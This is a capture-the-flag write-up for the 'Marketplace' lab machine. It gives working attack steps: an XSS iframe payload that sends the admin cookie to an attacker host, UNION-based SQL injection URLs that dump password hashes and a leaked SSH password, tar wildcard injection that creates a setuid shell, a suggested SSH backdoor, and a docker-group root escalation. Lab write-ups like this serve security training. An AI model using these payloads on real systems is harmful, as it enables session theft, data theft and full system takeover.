
# ***Marketplace***

## *Flag*

We'll start with nmap scan:

```bash
$ sudo nmap 10.10.164.27 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55 --script-args http.useragent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0"
```

Services:

- 22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 80/tcp    open  http    syn-ack ttl 62 nginx 1.19.2
- 32768/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)

On the website we can find 2 items with options "contact user" and "report". Try hitting
"report": you'll see that after your request is accepted, admin "reviews" the item and
sends you a feedback.

After firing up ZAP prozy and crawling around a website, we can discover that there's 
an XSS vulnerability in items' name. Let's combine it with the fact that admin checks
reported items and still their authentiaction token. Luckily for us, the auth cookie
doesn't have an adequate SameSite attribute. Create an item with the following name:

```html
<iframe src="javaScript:fetch('http://YOUR_IP:YOUR_PORT/?cookie='+btoa(document.cookie))" />
```

And then report this item. You'll receive admin's base64 encoded cookie. Replace your 
cookie with the admin's and reload the page.

---

## *User.txt*

After snooping around the admin panel, we can find that parameter user on page /admin
( /admin?user=2 ) is vulnerable to SQL injection. We'll manually exploit it.

***First*** step: Let's find out number of columns in this table:

- /admin?user=2 union select 1
- /admin?user=2 union select 1,2
- /admin?user=2 union select 1,2,3
- /admin?user=2 union select 1,2,3,4

We increase amount of columns until the error disappears.

***Second*** step: find out what is the underlying DBMS by invoking database-specific functions:

- /admin?user=2 union select user_name(),2,3,4: MsSQL, didn't work
- /admin?user=2 union select user(),2,3,4- MySQL, worked. 

***Third*** step: list tables in current database:

- /admin?user=null union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database()

Got tables:

- items
- messages
- users

***Fourth*** step: get column names:

- /admin?user=null union select 1, group_concat(column_name),3,4 from information_schema.columns where table_name="users"
    - id
    - username
    - password
    - isAdministrator 
- /admin?user=null union select 1, group_concat(column_name),3,4 from information_schema.columns where table_name="messages"
    - id
    - user_from
    - user_to
    - message_content
    - is_read 
- /admin?user=null union select 1, group_concat(column_name),3,4 from information_schema.columns where table_name="items"
    - id
    - author
    - title
    - description
    - image

***Fifth*** step: Dump database.
- Users: /admin?user=null union select (SELECT group_concat (concat_ws(':', id, username, password, isAdministrator) SEPARATOR '@') FROM users), 2,3,4

Split the result by ':' and form a table:

| id | username | admin | password                            |
|----|----------|-------|-------------------------------------|
| 1  | system   |  0    | $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW |
| 2  | michael  |  1    | $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q |
| 3  | jake     |  1    | $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG |
| 4  | test     |  0    | $2b$10$n9LcBu.VBqcbyC/n9YS5n.haF8rZ6Gb7cNkg4pzImKiWW2EM/HRC6 |

- Messages: /admin?user=null union select (SELECT group_concat (concat_ws(':', id, user_from, user_to, message_content) SEPARATOR '@') FROM messages), 2,3,4

| id | from | to | message_content                            |
|----|------|----|-------------------------------------|
| 1  | 1    | 3  | Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ |

Awesome, let's login as jake via SSH and get user's flag!

---

## *Root.txt*

Let's see what can we do with `sudo`:

```
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

backup sccript:

```
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

/opt/backups is writable for any user, so we can exploit tar wildcard injection.
We will navigate to /opt/backups and create files whose names are valid tar argumnets
and they will force tar to execute arbitrary code on behalf of michael:

```bash
$ cd /opt/backups

$ echo '#/!bin/bash' > shell.sh

$ echo 'cp /bin/bash /tmp/michaelbash && chmod +s /tmp/michaelbash' >> shell.sh

$ echo "" > "--checkpoint-action=exec=sh shell.sh"

$ echo "" > --checkpoint=1

$ cd /tmp

$ ./michaelbash -p
```

And that's it, you have access to michel's account. Now I suggest you create an SSH 
backdoor and login as michael.

`id` tells us, that michael's in "docker" group. It means, that michael can fetch
a docker image of an OS, mount host OS in docker container, enter it as roor
and from there modify host OS with root privileges.

List images:

```bash
$ docker images
```

There's an "alpine" image, let's exploit it:

```bash
$ docker run -v /root:/mnt -it alpine
```

In the new shell:

```bash
$ cd /mnt
```

And there's host OS root directory!
